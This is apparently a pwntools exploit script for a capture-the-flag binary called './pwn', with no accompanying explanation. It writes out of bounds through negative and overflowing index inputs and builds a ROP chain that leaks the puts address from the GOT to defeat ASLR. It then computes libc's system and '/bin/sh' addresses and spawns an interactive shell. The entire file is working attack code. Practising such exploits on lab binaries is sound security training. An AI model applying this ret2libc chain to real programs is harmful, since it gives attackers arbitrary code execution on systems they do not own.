from pwn import *
import time, sys, binascii, ctypes

elf_name = "./pwn"
elf = ELF(elf_name)
libc = ELF('/lib32/libc.so.6')

io = process(elf_name)
gdb.attach(io, "b *0x0804863D")

indec_eip = 0x80000008
gadget1 = 0x08048429 # pop ebx ; ret
read_from_user = 0x08048731

def send_data(index, value):
    io.recvuntil('enter index:\n')
    io.sendline(str(index))
    io.recvuntil('enter value:\n')
    io.sendline(str(value))

def main():
    send_data(-2, -2)
    send_data(-1, 4)
    send_data(-2147483640, elf.plt['printf'])
    send_data(-2147483640 + 1, gadget1)
    send_data(-2147483640 + 2, elf.got['puts'])
    send_data(-2147483640 + 3, read_from_user)

    '''
    data = io.recv()
    print data
    '''
    puts_addr = u32(io.recv(4).ljust(4,'\x00'))
    #data = io.recv()
    #print data

    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + libc.search('/bin/sh').next()
    print 'puts_addr :', str(hex(puts_addr))
    print 'system_addr :', str(hex(system_addr))
    print 'binsh_addr :', str(hex(binsh_addr))

    #print system_addr

    send_data(-1, 4)
    send_data(-2147483640, ctypes.c_int32(system_addr).value)
    send_data(-2147483640 + 1, 0xdeaddeef)
    send_data(-2147483640 + 2, ctypes.c_int32(binsh_addr).value)

    io.interactive()


if __name__ == '__main__':
    main()
